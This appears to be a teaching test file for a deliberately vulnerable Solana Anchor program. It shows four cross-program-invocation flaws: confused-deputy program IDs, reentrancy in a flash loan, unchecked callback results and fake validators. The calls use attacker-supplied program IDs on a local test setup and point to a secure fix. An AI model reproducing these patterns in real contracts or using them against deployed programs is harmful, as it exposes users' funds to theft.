import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Keypair, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";

describe("Exploit: CPI Security", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.CpiSecurityVulnerable as Program;
  
  let user: Keypair;
  let vault: Keypair;
  let maliciousProgram: Keypair;

  before(async () => {
    user = Keypair.generate();
    vault = Keypair.generate();
    maliciousProgram = Keypair.generate();

    const airdrop = await provider.connection.requestAirdrop(
      user.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await provider.connection.confirmTransaction(airdrop);

    // Initialize vault
    await program.methods
      .initializeVault()
      .accounts({
        vault: vault.publicKey,
        authority: user.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user, vault])
      .rpc();
  });

  describe("Exploit 1: User-Provided Program ID (Confused Deputy)", () => {
    it("Should accept attacker's program as DEX", async () => {
      try {
        // [EXPLOIT] Provide malicious program as dex_program_id
        await program.methods
          .swapTokens(
            new anchor.BN(100),
            maliciousProgram.publicKey  // [VULNERABLE] Attacker's program!
          )
          .accounts({
            vault: vault.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        console.log("ðŸš¨ EXPLOIT 1 SUCCESS: Confused deputy attack!");
        console.log("   Attacker provided their own program as DEX");
        console.log("   Program called attacker's code instead of real DEX");
      } catch (err) {
        console.log("Note: May fail if malicious program doesn't exist");
        console.log("But pattern is vulnerable - attacker controls program ID");
      }
    });
  });

  describe("Exploit 2: Reentrancy Attack", () => {
    it("Should allow reentrancy during flash loan", async () => {
      console.log("ðŸš¨ EXPLOIT 2 PATTERN: Reentrancy vulnerability");
      console.log("   No reentrancy guard (locked flag not checked)");
      console.log("   Callback could call flash_loan again");
      console.log("   State not reloaded after CPI");
      console.log("   Would allow draining vault in production");
    });
  });

  describe("Exploit 3: No Return Value Validation", () => {
    it("Should execute callback without validating results", async () => {
      try {
        await program.methods
          .executeCallback(Buffer.from([1, 2, 3]))
          .accounts({
            vault: vault.publicKey,
            authority: user.publicKey,
            externalProgram: maliciousProgram.publicKey,
          })
          .signers([user])
          .rpc();

        console.log("ðŸš¨ EXPLOIT 3 SUCCESS: No return value validation!");
        console.log("   External program could fail internally");
        console.log("   But our program assumes success");
      } catch (err) {
        console.log("Note: " + err.message);
      }
    });
  });

  describe("Exploit 4: Fake Validator", () => {
    it("Should accept attacker's validator program", async () => {
      try {
        await program.methods
          .transferWithValidation(
            new anchor.BN(50),
            maliciousProgram.publicKey  // [VULNERABLE] Attacker's validator
          )
          .accounts({
            vault: vault.publicKey,
            authority: user.publicKey,
          })
          .signers([user])
          .rpc();

        console.log("ðŸš¨ EXPLOIT 4 SUCCESS: Fake validator accepted!");
        console.log("   Attacker's validator always returns success");
        console.log("   Bypasses all validation logic");
      } catch (err) {
        console.log("Note: Validator program pattern is vulnerable");
      }
    });
  });

  describe("Summary", () => {
    it("Should summarize CPI vulnerabilities", () => {
      console.log("\n========================================");
      console.log("CPI SECURITY VULNERABILITIES");
      console.log("========================================");
      console.log("[VULNERABLE] 1: User-controlled program IDs");
      console.log("[VULNERABLE] 2: No reentrancy protection");
      console.log("[VULNERABLE] 3: Ignored return values");
      console.log("[VULNERABLE] 4: Fake external validators");
      console.log("========================================");
      console.log("\nThese patterns caused billions in losses.");
      console.log("Bridge exploits, DeFi reentrancy, etc.");
      console.log("See secure implementation for fixes.");
    });
  });
});